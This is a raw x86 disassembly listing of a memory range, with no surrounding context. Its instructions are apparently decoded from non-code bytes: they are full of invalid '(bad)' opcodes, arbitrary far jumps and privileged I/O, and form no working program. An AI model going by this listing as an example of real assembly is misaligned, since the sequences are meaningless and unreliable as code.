  4037b2:	xor    ah,BYTE PTR [edi+esi*1-0x8df5e0b]
  4037b9:	arpl   WORD PTR [ecx+0x4c],cx
  4037bc:	mov    ecx,DWORD PTR ds:0x23f1931b
  4037c2:	mov    ds:0xd06b015b,eax
  4037c7:	xor    esp,DWORD PTR [ebx+0x6b585d59]
  4037cd:	xchg   edx,eax
  4037ce:	lahf   
  4037cf:	dec    ebx
  4037d0:	mov    ah,0xfd
  4037d2:	dec    edi
  4037d3:	cmp    DWORD PTR [ecx+0x40],edx
  4037d6:	adc    BYTE PTR [ecx],ch
  4037d8:	mov    ebp,0x82d148e1
  4037dd:	mov    edi,eax
  4037df:	cmp    al,al
  4037e1:	add    DWORD PTR [ebp+0x6e],ebp
  4037e4:	mov    eax,ds:0x42874af5
  4037e9:	mov    esi,0x3c3e033a
  4037ee:	aas    
  4037ef:	pop    eax
  4037f0:	clc    
  4037f1:	loope  0x4037e5
  4037f3:	aad    0x8a
  4037f5:	or     ch,bh
  4037f7:	inc    ebx
  4037f8:	sub    al,0x9e
  4037fa:	cmp    ah,BYTE PTR [eax-0xe8b69e5]
  403800:	sub    BYTE PTR [edi-0x4e],ch
  403803:	sub    cl,bl
  403805:	ja     0x40385b
  403807:	xor    DWORD PTR [edx],ebp
  403809:	aad    0x8b
  40380b:	das    
  40380c:	nop
  40380d:	mov    edx,0xb219cdf1
  403812:	fwait
  403813:	bound  edx,QWORD PTR [eax-0x6b8066bb]
  403819:	sub    BYTE PTR [ebx],ah
  40381b:	cwde   
  40381c:	xchg   edx,eax
  40381d:	mov    esp,0x9ecf6300
  403822:	(bad)  
  403824:	mov    gs,WORD PTR [edi+0x31528d74]
  40382a:	cmp    al,0xbe
  40382c:	shl    BYTE PTR [ebp+0x60f79557],0x3f
  403833:	sub    DWORD PTR [eax+0x6103ed44],ecx
  403839:	jmp    0x17db452c
  40383e:	cs leave 
  403840:	sub    BYTE PTR [esi+0x71c7c4de],0x36
  403847:	pop    ss
  403848:	retf   
  403849:	dec    ecx
  40384a:	mov    ds:0xbb971a9c,al
  40384f:	mov    bh,0xb9
  403852:	push   ss
  403853:	or     al,BYTE PTR [ecx+ecx*4]
  403856:	xchg   ebx,eax
  403857:	iret   
  403858:	lahf   
  403859:	adc    eax,0x33fbd34d
  40385e:	and    al,0x26
  403860:	cmc    
  403861:	lahf   
  403862:	ins    DWORD PTR es:[edi],dx
  403863:	aas    
  403864:	adc    BYTE PTR [ebp-0x52],0x69
  403868:	lods   eax,DWORD PTR ds:[esi]
  403869:	mov    bl,0x76
  40386b:	jge    0x4037ff
  40386d:	inc    BYTE PTR [eax-0x75a6aa3a]
  403873:	imul   esp,DWORD PTR [ecx+0x2a],0xffffff81
  403877:	push   es
  403878:	sub    bh,BYTE PTR [edi-0x18cf95db]
  40387e:	(bad)  
  40387f:	outs   dx,BYTE PTR ds:[esi]
  403880:	div    DWORD PTR [edi+0xbefdd]
  403886:	js     0x4038fe
  403888:	adc    edx,DWORD PTR [eax-0x2]
  40388b:	jmp    0x1623:0xe951bd41
  403892:	cdq    
  403893:	(bad)  
  403894:	mov    ebx,0x2fbcded
  403899:	dec    edi
  40389a:	add    eax,DWORD PTR [esi+eiz*8-0xb148306]
  4038a1:	scas   eax,DWORD PTR es:[edi]
  4038a2:	dec    ebx
  4038a3:	pop    edi
  4038a4:	(bad)  
  4038a5:	in     eax,0x42
  4038a7:	leave  
  4038a8:	dec    edi
  4038a9:	push   cs
  4038aa:	lahf   
  4038ab:	lea    ecx,[ecx]
  4038ad:	aam    0xa5
  4038af:	into   
  4038b0:	push   cs
  4038b1:	mov    dl,0x2
  4038b3:	retf   
  4038b4:	and    DWORD PTR [edx+0x33],ebx
  4038b7:	xchg   esi,eax
  4038b8:	mov    eax,ecx
  4038ba:	ficomp WORD PTR [edi-0x2a3a3f8]
  4038c0:	cli    
  4038c1:	pop    esi
  4038c2:	pop    ebp
  4038c3:	pop    ss
  4038c4:	in     eax,dx
  4038c5:	dec    ecx
  4038c6:	jge    0x40392f
  4038c8:	stos   BYTE PTR es:[edi],al
  4038c9:	out    dx,al
  4038ca:	mov    ecx,0x1048a487
  4038cf:	xor    BYTE PTR [esi+esi*1+0x550cbd38],dh
  4038d6:	sti    
  4038d7:	pcmpeqw mm3,mm2
  4038da:	and    DWORD PTR [edi-0x2d9b7d69],eax
  4038e0:	push   es
  4038e1:	cdq    
  4038e2:	shl    DWORD PTR [ebx+0x35],0x4d
  4038e6:	sbb    cl,BYTE PTR [ebx+0x447df962]
  4038ec:	push   edx
  4038ed:	call   0x2f4ada5c
  4038f2:	ret    
  4038f3:	test   al,0xd0
  4038f5:	popa   
  4038f6:	fisub  WORD PTR [eax-0x80]
  4038f9:	scas   eax,DWORD PTR es:[edi]
  4038fa:	dec    esp
  4038fb:	xchg   esp,eax
  4038fc:	mov    eax,ds:0x40d9d865
  403901:	mov    ?,WORD PTR [edx+edx*4+0x354f16af]
  403908:	(bad)  
  403909:	rol    DWORD PTR [ebx],1
  40390b:	std    
  40390c:	cmp    BYTE PTR [ebx-0x1a],0x69
  403910:	and    ebp,DWORD PTR [bp+si+0xa]
  403914:	test   BYTE PTR [edi+0x35],ch
  403917:	daa    
  403918:	xchg   ebp,eax
  403919:	push   edx
  40391a:	mov    edx,DWORD PTR [edx]
  40391c:	xchg   ebp,eax
  40391d:	push   ds
  40391e:	adc    ch,ah
  403920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403921:	bound  edi,QWORD PTR [edi]
  403923:	xor    al,0x74
  403925:	mov    eax,ds:0x6a89b710
  40392a:	or     al,0x49
  40392c:	arpl   WORD PTR [eax-0x6ce26716],di
  403932:	xchg   ebp,eax
  403933:	push   cs
  403934:	fcomp  QWORD PTR [eax+0x3d0fd860]
  40393a:	mov    DWORD PTR [ebp+edi*1-0x53],ebx
  40393e:	int3   
  40393f:	out    dx,al
  403940:	aas    
  403941:	cli    
  403942:	xchg   ebp,eax
  403943:	scas   eax,DWORD PTR es:[edi]
  403944:	sub    al,0xc2
  403946:	cmp    BYTE PTR [ebx+edi*4+0x12],ah
  40394a:	sbb    ecx,edx
  40394c:	fmul   QWORD PTR [edi]
  40394e:	sbb    eax,0x15173ba0
  403953:	lea    eax,[edx+0x3bb107b9]
  403959:	inc    BYTE PTR [ecx-0x38dad282]
  40395f:	pusha  
  403960:	arpl   WORD PTR [eax+0x53c4caa],si
  403966:	pop    ecx
  403967:	fadd   DWORD PTR [eax+0x6a1f596]
  40396d:	retf   
  40396e:	xchg   DWORD PTR [edi],esp
  403970:	retf   0xee31
  403973:	push   ebx
  403974:	pop    ebx
  403975:	cmp    al,0xcb
  403977:	sub    BYTE PTR [esi+0x2f],bh
  40397a:	dec    edx
  40397b:	popa   
  40397c:	pushf  
  40397d:	sbb    BYTE PTR [ecx+eax*2+0x50f64166],ah
  403984:	mov    ah,0x72
  403986:	dec    ecx
  403987:	in     eax,dx
  403988:	pop    esi
  403989:	push   es
  40398a:	por    mm3,QWORD PTR [ecx+0x5c]
  40398e:	arpl   WORD PTR [ebx],dx
  403990:	xchg   edi,eax
  403991:	dec    ecx
  403992:	fwait
  403993:	mov    dh,0xfe
  403995:	pop    esi
  403996:	sahf   
  403997:	sub    eax,0xf718d73e
  40399c:	sbb    dl,ah
  40399e:	into   
  40399f:	call   0x5068549a
  4039a4:	es and al,0xfc
  4039a7:	jmp    0xc540fd6d
  4039ac:	pop    es
  4039ad:	ficomp WORD PTR [ebp+0x28]
  4039b0:	push   eax
  4039b1:	xchg   edi,eax
  4039b2:	and    esi,DWORD PTR [ebx+esi*8]
  4039b5:	repnz test DWORD PTR [eax+0x370353f],ebx
  4039bc:	(bad)
  4039c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039c1:	xor    edi,esi
  4039c3:	out    0xb9,al
  4039c5:	aas    
  4039c6:	loopne 0x403987
  4039c8:	int3   
  4039c9:	(bad)  [ebp-0x2fad1f6c]
  4039cf:	xchg   ebx,eax
  4039d0:	mov    esi,0xa3485b6b
  4039d5:	sub    DWORD PTR [edi+0xf139a15],esp
  4039db:	nop
  4039dc:	inc    eax
  4039dd:	fstp   QWORD PTR [edx+0x5f18b789]
  4039e3:	jmp    0x403a18
  4039e5:	and    DWORD PTR [eax+ebp*8+0x354bb80c],edx
  4039ec:	scas   al,BYTE PTR es:[edi]
  4039ed:	add    eax,0xa8eeb72a
  4039f2:	inc    esp
  4039f3:	retf   0xaad1
  4039f6:	mov    bh,0x5f
  4039f8:	mov    ch,0xc6
  4039fa:	inc    edi
  4039fb:	dec    DWORD PTR [ecx+0x155c46f7]
  403a01:	cli    
  403a02:	call   0xbdab6564
  403a07:	addr16 adc eax,0x3400d5f7
  403a0d:	xchg   ebx,eax
  403a0e:	ret    0x1add
  403a11:	call   DWORD PTR [edx+0x5c0c44de]
  403a17:	dec    eax
  403a18:	shr    dl,cl
  403a1a:	lods   eax,DWORD PTR ds:[esi]
  403a1b:	xor    al,0x72
  403a1d:	lods   al,BYTE PTR ds:[esi]
  403a1e:	push   ss
  403a1f:	jmp    0x5cc9:0x590b3873
  403a26:	or     bl,BYTE PTR [ecx+0xc055c0a]
  403a2c:	retf   0x1398
  403a2f:	rol    BYTE PTR [esi],0x43
  403a32:	enter  0x9c58,0xf0
  403a36:	jmp    0xed90:0x160fda4d
  403a3d:	mov    esp,cs
  403a3f:	repnz adc al,0xe0
  403a42:	js     0x403a4e
  403a44:	test   DWORD PTR ds:0xa17ac994,eax
  403a4a:	bound  ebp,QWORD PTR [esi-0x3f]
  403a4d:	mul    DWORD PTR es:[eax]
  403a50:	repz sbb al,cl
  403a53:	adc    eax,0x359a8a2a
  403a58:	mov    WORD PTR [esi],gs
  403a5a:	xchg   edx,eax
  403a5b:	xor    al,0xa7
  403a5d:	pop    ecx
  403a5e:	push   ebx
  403a5f:	lock pop esp
  403a61:	xor    BYTE PTR ds:0x9b21fd6d,bh
  403a67:	xchg   cl,bh
  403a69:	mov    dh,0xb3
  403a6b:	dec    esp
  403a6c:	and    al,0x3
  403a6e:	ror    BYTE PTR [eax-0x4],0xa2
  403a72:	jne    0x403a52
  403a74:	(bad)  
  403a75:	sub    dh,BYTE PTR [edi-0x67]
  403a78:	dec    edi
  403a79:	push   ds
  403a7a:	in     al,0xda
  403a7c:	daa    
  403a7d:	push   ecx
  403a7e:	sbb    esi,edx
  403a80:	jecxz  0x403ab8
  403a82:	mov    esi,0xbc74ef72
  403a87:	dec    eax
  403a88:	popf   
  403a89:	lds    esi,FWORD PTR [edx]
  403a8b:	dec    edi
  403a8c:	imul   esi,DWORD PTR [esi+0x4a],0xffffffbc
  403a90:	rcl    DWORD PTR [esi+ecx*4-0x2afa9d72],cl
  403a97:	fadd   DWORD PTR es:[eax]
  403a9a:	out    dx,al
  403a9b:	pusha  
  403a9c:	cmp    DWORD PTR [ecx+eiz*2],eax
  403a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa0:	adc    ch,BYTE PTR [eax]
  403aa2:	loopne 0x403a46
  403aa4:	sub    edx,eax
  403aa6:	mov    esp,0x43a039b4
  403aab:	push   es
  403aac:	int    0xc5
  403aae:	sub    eax,0xa5254d65
  403ab3:	(bad)  
  403ab4:	or     dl,BYTE PTR [edi]
  403ab6:	jno    0x403a4c
  403ab8:	mov    eax,ds:0x59a15e17
  403abd:	ds (bad) 
  403abf:	into   
  403ac0:	sbb    al,BYTE PTR [edx]
  403ac2:	arpl   WORD PTR [eax+0x65],sp
  403ac5:	aad    0xb5
  403ac7:	mov    esi,0x947e831
  403acc:	fld    DWORD PTR [ecx-0x1c4cd45c]
  403ad2:	mov    bh,0x9c
  403ad4:	(bad)  
  403ad5:	push   esi
  403ad6:	push   0xda184a75
  403adb:	js     0x403a91
  403add:	iretw  
  403adf:	test   ax,0xdfd4
  403ae3:	adc    al,0x27
  403ae5:	pop    ds
  403ae6:	sub    eax,0x7f161b89
  403aeb:	xlat   BYTE PTR ds:[ebx]
  403aec:	in     al,dx
  403aed:	inc    ebp
  403aee:	and    al,0x4f
  403af0:	bnd jmp 0x33131b50
  403af6:	add    dh,bh
  403af8:	lods   eax,DWORD PTR ds:[esi]
  403af9:	xchg   ebp,eax
  403afa:	xchg   ebx,eax
  403afb:	xchg   esp,eax
  403afc:	fidiv  DWORD PTR [ebp-0x13]
  403aff:	dec    esi
  403b00:	push   esp
  403b01:	sub    BYTE PTR ds:0xcdb43696,bh
  403b07:	imul   ebp,DWORD PTR [esi-0x45],0x197797d6
  403b0e:	adc    al,BYTE PTR [ecx+0x76]
  403b11:	mov    ah,0xfa
  403b13:	(bad)  
  403b14:	fmul   DWORD PTR [ebx+0x17]
  403b17:	inc    esp
  403b18:	dec    ecx
  403b19:	push   0xf4d43616
  403b1e:	shl    DWORD PTR [esi-0x6],0xb6
  403b22:	jecxz  0x403aa4
  403b24:	mov    ds:0x4874d1e5,eax
  403b29:	ret    
  403b2a:	pop    ds
  403b2b:	addr16 imul esi,edi,0x4ac0047e
  403b32:	inc    ebx
  403b33:	push   0x24658285
  403b38:	pusha  
  403b39:	pop    es
  403b3a:	adc    dl,BYTE PTR [edi]
  403b3c:	pop    esi
  403b3d:	jmp    0x403b26
  403b3f:	stos   BYTE PTR es:[edi],al
  403b40:	loop   0x403b39
  403b42:	lods   eax,DWORD PTR ds:[esi]
  403b43:	pop    edi
  403b44:	ss (bad) 
  403b47:	mov    ch,0x61
  403b49:	jmp    0x1f036a36
  403b4e:	shl    esi,0x23
  403b51:	sar    DWORD PTR [ebx],1
  403b53:	sahf   
  403b54:	xchg   edx,eax
  403b55:	push   esp
  403b56:	test   ecx,ebx
  403b58:	fldpi  
  403b5a:	mov    bh,0xb3
  403b5c:	daa    
  403b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b5e:	add    BYTE PTR [edx+0xd],0x44
  403b62:	outs   dx,BYTE PTR ds:[esi]
  403b63:	cmc    
  403b64:	fcmovnb st,st(4)
  403b66:	out    0xf4,eax
  403b68:	add    eax,0x690cb91b
  403b6d:	inc    eax
  403b6e:	cmp    eax,0x3e5ce8f9
  403b73:	sti    
  403b74:	scas   al,BYTE PTR es:[edi]
  403b75:	push   edi
  403b76:	jge    0x403b26
  403b78:	(bad)  
  403b7a:	dec    ebx
  403b7b:	push   esp
  403b7c:	mov    ebx,0x4a031246
  403b81:	pop    ebx
  403b82:	es test eax,0x83f52982
  403b88:	aad    0x5c
  403b8a:	mov    al,BYTE PTR ds:0xca0f2004
  403b90:	xchg   ebx,eax
  403b91:	sahf   
  403b92:	sti    
  403b93:	pushf  
  403b94:	push   es
  403b95:	bound  esp,QWORD PTR [esi-0x64]
  403b98:	ret    0x5685
  403b9b:	scas   eax,DWORD PTR es:[edi]
  403b9c:	fiadd  DWORD PTR [edi]
  403b9e:	lahf   
  403b9f:	aad    0xb0
  403ba1:	push   es
  403ba2:	arpl   ax,di
  403ba4:	js     0x403b64
  403ba6:	test   al,0x8a
  403ba8:	push   cs
  403ba9:	daa    
  403baa:	inc    ebx
  403bab:	ds enter 0x4f85,0xa4
  403bb0:	mov    al,0x13
  403bb2:	mov    edi,0x4ae7762c
  403bb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb8:	lock cld 
  403bba:	sub    eax,DWORD PTR [ebx-0x5d]
  403bbd:	rcl    DWORD PTR [ebp+0x2e],cl
  403bc0:	or     bl,BYTE PTR [eax+eiz*4-0x2e8cd9c4]
  403bc7:	aad    0xe2
  403bc9:	retf   
  403bca:	mov    edx,0xbbf40601
  403bcf:	mov    WORD PTR [ebp-0x3e4ba536],ds
  403bd5:	mov    ds:0xdf9ffafb,al
  403bda:	icebp  
  403bdb:	jmp    0xa2ac:0xa539f29f
  403be2:	out    0x4a,al
  403be4:	leave  
  403be5:	lods   al,BYTE PTR ds:[esi]
  403be6:	or     eax,0x90380606
  403beb:	xchg   ebx,eax
  403bec:	fst    QWORD PTR [edi+0xe4f720e]
  403bf2:	push   ds
  403bf3:	or     eax,0x15b12f68
  403bf8:	cmc    
  403bf9:	fisttp WORD PTR [ebp+0x57]
  403bfc:	mov    esi,0xae383d72
  403c01:	mov    cl,0xdd
  403c03:	jno    0x403bfe
  403c05:	mov    al,ds:0xb8fc1a00
  403c0a:	call   0x7fb466f8
  403c0f:	(bad)  [ecx]
  403c11:	inc    edi
  403c12:	lahf   
  403c13:	dec    esi
  403c14:	mov    ch,0x6f
  403c16:	loopne 0x403c6c
  403c18:	daa    
  403c19:	cmp    ebx,DWORD PTR [edi]
  403c1b:	xchg   esi,eax
  403c1c:	js     0x403c62
  403c1e:	cld    
  403c1f:	pop    es
  403c20:	fsub   QWORD PTR [ecx-0x7a]
  403c23:	mov    esi,0xd070db2f
  403c28:	dec    esp
  403c29:	into   
  403c2a:	dec    esi
  403c2b:	sub    al,0x82
  403c2d:	mov    cl,0x4f
  403c2f:	mov    dh,0x20
  403c31:	(bad)  
  403c32:	sub    ecx,esp
  403c34:	neg    BYTE PTR [eax-0x77c27fc4]
  403c3a:	popa   
  403c3b:	pop    esp
  403c3c:	push   ss
  403c3d:	xchg   esp,eax
  403c3e:	inc    esi
  403c3f:	daa    
  403c40:	mov    edx,0x29a7be37
  403c45:	cmp    edx,DWORD PTR [eax+0x77]
  403c48:	push   edi
  403c49:	setno  BYTE PTR [edi]
  403c4c:	in     eax,0x8d
  403c4e:	out    dx,al
  403c4f:	loop   0x403c77
  403c51:	jmp    FWORD PTR [edi-0x46e91a6]
  403c57:	cdq    
  403c58:	push   edi
  403c59:	push   0x72
  403c5b:	mov    BYTE PTR [ecx-0x2],ah
  403c5e:	push   ecx
  403c5f:	retf   0xdc3f
  403c62:	(bad)  
  403c63:	retf   
  403c64:	pop    ds
  403c65:	rol    DWORD PTR [ebx+0x30f2529f],1
  403c6b:	cmp    DWORD PTR [eax],esp
  403c6d:	sub    BYTE PTR [esi-0x41],bh
  403c70:	push   edi
  403c71:	add    DWORD PTR [ebx],ebp
  403c73:	rcr    DWORD PTR [eax-0x299e36ed],1
  403c79:	mov    al,ds:0x56faafdb
  403c7e:	lods   al,BYTE PTR ds:[esi]
  403c7f:	cmp    bl,0x1
  403c82:	out    dx,eax
  403c83:	cmp    eax,DWORD PTR [edi]
  403c85:	push   0x69
  403c87:	jmp    0x75d6:0xe4c823fd
  403c8e:	ds mov ch,0x35
  403c91:	dec    ebp
  403c92:	cli    
  403c93:	nop
  403c94:	ja     0x403c77
  403c96:	xchg   ecx,eax
  403c97:	inc    eax
  403c98:	call   FWORD PTR [ecx-0x629b1bfa]
  403c9e:	daa    
  403c9f:	dec    ecx
  403ca0:	xchg   esp,eax
  403ca1:	in     eax,dx
  403ca2:	clc    
  403ca3:	inc    ebp
  403ca4:	pop    ecx
  403ca5:	fisttp QWORD PTR [esi+0xf]
  403ca8:	inc    esp
  403ca9:	pop    ds
  403caa:	aad    0x4b
  403cac:	mov    BYTE PTR [eax+0x2e],ah
  403caf:	cwde   
  403cb0:	outs   dx,BYTE PTR ds:[esi]
  403cb1:	xchg   ecx,eax
  403cb2:	dec    edx
  403cb3:	sub    BYTE PTR [ecx],ch
  403cb5:	dec    ecx
  403cb6:	loop   0x403c91
  403cb8:	cmc    
  403cb9:	aaa    
  403cba:	cld    
  403cbb:	data16 fiadd WORD PTR [eiz*1+0x66fd61be]
  403cc3:	xor    cl,BYTE PTR [eax-0x64]
  403cc6:	add    BYTE PTR [esi+0x4c0197b4],bh
  403ccc:	mov    dl,0x8d
  403cce:	fld    TBYTE PTR ds:0x36d349f6
  403cd4:	stos   BYTE PTR es:[edi],al
  403cd5:	xchg   ebx,eax
  403cd6:	sti    
  403cd7:	sbb    eax,0xd50bd39a
  403cdc:	lds    edx,FWORD PTR [edi-0xa]
  403cdf:	call   0x1e8e:0x39bf6cfd
  403ce6:	sar    dl,0x33
  403ce9:	aas    
  403cea:	scas   eax,DWORD PTR es:[edi]
  403ceb:	adc    DWORD PTR [esi+0x42],ebx
  403cee:	cld    
  403cef:	(bad)  
  403cf0:	push   cs
  403cf1:	mov    WORD PTR [ecx+0x2a],ds
  403cf4:	aas    
  403cf5:	push   ds
  403cf6:	mov    dh,bh
  403cf8:	data16 aas 
  403cfa:	cmp    cl,BYTE PTR [ebx-0x5c]
  403cfd:	nop
  403cfe:	pop    eax
  403cff:	jne    0x403d3c
  403d01:	jle    0x403d68
  403d03:	xor    ch,BYTE PTR [ebp-0xca3eb84]
  403d09:	es sub ebp,edi
  403d0c:	mov    bh,0x52
  403d0e:	sub    ecx,DWORD PTR [edx]
  403d10:	jo     0x403d3b
  403d12:	lea    ebp,[edi-0x60]
  403d15:	sub    al,0x12
  403d17:	in     al,0xfd
  403d19:	cmp    DWORD PTR ds:0x33627e0e,ebp
  403d1f:	push   ebp
  403d20:	test   BYTE PTR [edx],bh
  403d22:	stos   DWORD PTR es:[edi],eax
  403d23:	and    eax,0x1cbe62e7
  403d28:	adc    BYTE PTR gs:[ecx-0x51],bh
  403d2c:	call   0xc6e2:0x4dd0cb28
  403d33:	jecxz  0x403d5b
  403d35:	sub    ah,bh
  403d37:	push   esi
  403d38:	push   0xffffffd2
  403d3a:	cmc    
  403d3b:	sbb    esp,DWORD PTR [ecx+0x3520bfdd]
  403d41:	sub    al,BYTE PTR ds:[ecx+0x60bacecf]
  403d48:	sbb    dl,ch
  403d4a:	or     eax,0xff809398
  403d4f:	sub    al,bl
  403d51:	(bad)  
  403d52:	sub    eax,0xc6b94d93
  403d57:	pop    ss
  403d58:	(bad)  
  403d59:	adc    BYTE PTR [esi],dh
  403d5b:	ficomp DWORD PTR [esi+edi*4-0x35]
  403d5f:	retf   0xcdb0
  403d62:	jl     0x403d08
  403d64:	out    dx,al
  403d65:	dec    edx
  403d66:	adc    ebp,DWORD PTR [esi+eax*4-0x20cb717a]
  403d6d:	sbb    DWORD PTR [esi+0x50571377],ebx
  403d73:	jns    0x403d8f
  403d75:	stos   DWORD PTR es:[edi],eax
  403d76:	aaa    
  403d77:	pusha  
  403d78:	out    dx,al
  403d79:	imul   eax,ebx,0x5d
  403d7c:	loop   0x403d1e
  403d7e:	push   0x6c
  403d80:	inc    ecx
  403d81:	push   ebx
  403d82:	mov    bh,0xe2
  403d84:	aad    0xd
  403d86:	bound  ebp,QWORD PTR [esi]
  403d88:	test   eax,0x46e7992e
  403d8d:	lds    esi,FWORD PTR [eax-0x25]
  403d90:	or     eax,0x57da13fc
  403d95:	push   cs
  403d96:	call   esi
  403d98:	cmp    eax,0xa24c4370
  403d9d:	lods   eax,DWORD PTR ds:[esi]
  403d9e:	xchg   esp,eax
  403d9f:	pop    edi
  403da0:	mov    eax,0xce7eaf33
  403da5:	or     edi,DWORD PTR [eax]
  403da7:	or     eax,0xac7ace2
  403dac:	cmp    DWORD PTR [ecx-0x11],0x4e
  403db0:	call   0x5b416250
  403db5:	popf   
  403db6:	stc    
  403db7:	jb     0x403da8
  403db9:	adc    al,0xeb
  403dbb:	test   DWORD PTR [esi+eax*8-0x4bc2e533],edx
  403dc2:	das    
  403dc3:	jmp    0x7a3ffa9d
  403dc8:	leave  
  403dc9:	or     al,0x93
  403dcb:	mov    ecx,0x5181092a
  403dd0:	popf   
  403dd1:	xchg   DWORD PTR [ecx],edi
  403dd3:	or     eax,0x6d84cb6c
  403dd8:	imul   esi,DWORD PTR [esi],0xffffffde
  403ddb:	sti    
  403ddc:	xchg   esp,eax
  403ddd:	les    ecx,FWORD PTR [edx-0x42e91bc6]
  403de3:	push   esp
  403de4:	inc    ecx
  403de5:	test   ebp,eax
  403de7:	inc    ebp
  403de9:	jle    0x403e67
  403deb:	in     eax,0x6c
  403ded:	pop    ebx
  403dee:	lods   al,BYTE PTR ds:[esi]
  403def:	loope  0x403e64
  403df1:	inc    esp
  403df2:	mov    bl,0xb8
  403df4:	sub    BYTE PTR [ecx-0x67],0x6
  403df8:	xchg   BYTE PTR [esi+0x5e],bh
  403dfb:	arpl   WORD PTR [edi-0x694da8cc],bp
  403e01:	aaa    
  403e02:	ss rol al,0xf1
  403e06:	das    
  403e07:	xor    al,0x3
  403e09:	add    BYTE PTR [edx-0x14],bl
  403e0c:	xor    al,0xf3
  403e0e:	jnp    0x403de5
  403e10:	iret   
  403e11:	push   ecx
  403e12:	cld    
  403e13:	loope  0x403e41
  403e15:	je     0x403e35
  403e17:	xor    ebx,DWORD PTR [ecx+0x64348d]
  403e1d:	pop    es
  403e1e:	mov    sp,bx
  403e21:	sbb    BYTE PTR [esi-0x38],bl
  403e24:	push   0x4288510d
  403e29:	lods   eax,DWORD PTR ds:[esi]
  403e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e2b:	push   0x8ea06e8c
  403e30:	gs sti 
  403e32:	aad    0xcc
  403e34:	add    BYTE PTR [ebp+0x2f],ah
  403e37:	inc    eax
  403e38:	adc    eax,0x5772de48
  403e3d:	loope  0x403eb3
  403e3f:	push   eax
  403e40:	xchg   ecx,eax
  403e41:	or     esp,DWORD PTR ds:0x1a828d22
  403e47:	sub    eax,0x779806a5
  403e4c:	scas   eax,DWORD PTR es:[edi]
  403e4d:	(bad)  
  403e4e:	frstor [eax+0x3c]
  403e51:	hlt    
  403e52:	sub    ah,BYTE PTR [eax+0x47]
  403e55:	(bad)  
  403e56:	dec    edx
  403e57:	imul   esp,DWORD PTR [ebx-0x55],0xffffff92
  403e5b:	xchg   esp,eax
  403e5c:	fisttp DWORD PTR [ecx+ebp*4+0x5b]
  403e60:	sbb    esp,DWORD PTR [eax]
  403e62:	cwde   
  403e63:	xchg   ebp,eax
  403e64:	addr16 xchg esp,eax
  403e66:	xchg   esi,esi
  403e68:	rcr    DWORD PTR [edx+0x24d3c274],0xe1
  403e6f:	jmp    0xca25:0x2da52980
  403e76:	xchg   edx,eax
  403e77:	cmp    ah,bh
  403e79:	cmc    
  403e7a:	inc    eax
  403e7b:	jb     0x403e03
  403e7d:	dec    esi
  403e7e:	cmp    eax,0x8331eb21
  403e83:	push   cs
  403e84:	fadd   st,st(0)
  403e86:	pusha  
  403e87:	stos   DWORD PTR es:[edi],eax
  403e88:	clc    
  403e89:	add    DWORD PTR [edi-0xb7c8ce0],0x47
  403e90:	mov    cs,WORD PTR [ebx-0x3406f96c]
  403e96:	test   DWORD PTR [esi+0x4315a5bc],esp
  403e9c:	out    0x32,al
  403e9e:	js     0x403ebb
  403ea0:	stc    
  403ea1:	push   ds
  403ea2:	cmp    bl,dl
  403ea4:	jbe    0x403e81
  403ea6:	xor    bh,ah
  403ea8:	pusha  
  403ea9:	cli    
  403eaa:	adc    eax,0x1b45ce13
  403eaf:	inc    ecx
  403eb0:	stc    
  403eb1:	out    dx,eax
  403eb2:	jmp    0x403e51
  403eb4:	xor    BYTE PTR [eax-0xf816dbd],cl
  403eba:	(bad)  
  403ebb:	mov    bl,0xa7
  403ebd:	test   eax,0x1693b695
  403ec2:	xor    al,0x58
  403ec4:	out    dx,al
  403ec5:	sub    DWORD PTR [edi+0x7e142bdd],edx
  403ecb:	test   eax,0x7549788a
  403ed0:	mov    dh,BYTE PTR [ebx+0x4]
  403ed3:	pop    esi
  403ed4:	dec    edi
  403ed5:	mov    bh,0xcc
  403ed7:	cmp    eax,0x5d3819e
  403edc:	mov    DWORD PTR [edi+ecx*4],0xf9e4d550
  403ee3:	sbb    ebp,DWORD PTR [edx-0x1772c155]
  403ee9:	in     eax,dx
  403eea:	mov    ecx,0xf7f2ae06
  403eef:	out    dx,al
  403ef0:	fist   DWORD PTR [ecx-0x66]
  403ef3:	rol    DWORD PTR [eax+0x0],1
  403ef6:	xchg   ebx,eax
  403ef7:	xor    ebx,ebp
  403ef9:	mov    ecx,0x2452fd9f
  403efe:	je     0x403eac
  403f00:	(bad)  
  403f01:	rcr    cl,1
  403f03:	sub    al,0x64
  403f05:	sub    ebx,ecx
  403f07:	jecxz  0x403f0c
  403f09:	or     DWORD PTR [edi-0x74b532e3],eax
  403f0f:	inc    ecx
  403f10:	(bad)  
  403f11:	mov    al,0x88
  403f13:	inc    edi
  403f14:	jns    0x403eda
  403f16:	and    BYTE PTR ds:0x4603e48e,0xb0
  403f1d:	aas    
  403f1e:	stos   DWORD PTR es:[edi],eax
  403f1f:	stc    
  403f20:	dec    edx
  403f21:	mov    ch,0xc1
  403f23:	inc    esi
  403f24:	or     DWORD PTR [edi],esi
  403f26:	arpl   WORD PTR [edx+0x581d23d8],di
  403f2c:	mov    esi,0x98aac2ed
  403f31:	ins    BYTE PTR es:[edi],dx
  403f32:	mov    eax,0x1a101329
  403f37:	mov    al,0xc5
  403f39:	push   eax
  403f3a:	mov    ecx,0xb7c07f8f
  403f3f:	fimul  WORD PTR [ecx+ecx*4]
  403f42:	jg     0x403f55
  403f44:	test   BYTE PTR [edx-0x4c2f5f22],bh
  403f4a:	or     al,0x4d
  403f4c:	dec    eax
  403f4d:	xchg   ecx,eax
  403f4e:	jge    0x403f0b
  403f50:	es mov ch,0x5e
  403f53:	scas   al,BYTE PTR es:[edi]
  403f54:	mov    al,0x67
  403f56:	jmp    0x403ee5
  403f58:	mov    dh,BYTE PTR [eax+0x36]
  403f5b:	lods   eax,DWORD PTR ds:[esi]
  403f5c:	fsub   QWORD PTR [ecx-0x6b2b150]
  403f62:	add    DWORD PTR [ecx+0x63],ecx
  403f65:	std    
  403f66:	mov    esp,cs
  403f68:	cmp    BYTE PTR [edi],0xa6
  403f6b:	jmp    0xa327a30c
  403f70:	pop    es
  403f71:	push   ebx
  403f72:	sub    al,0xde
  403f74:	cmp    ebx,esp
  403f76:	jmp    0xa37d:0xc6a1f865
  403f7d:	jno    0x403f13
  403f7f:	and    esi,0x4c37432a
  403f85:	leave  
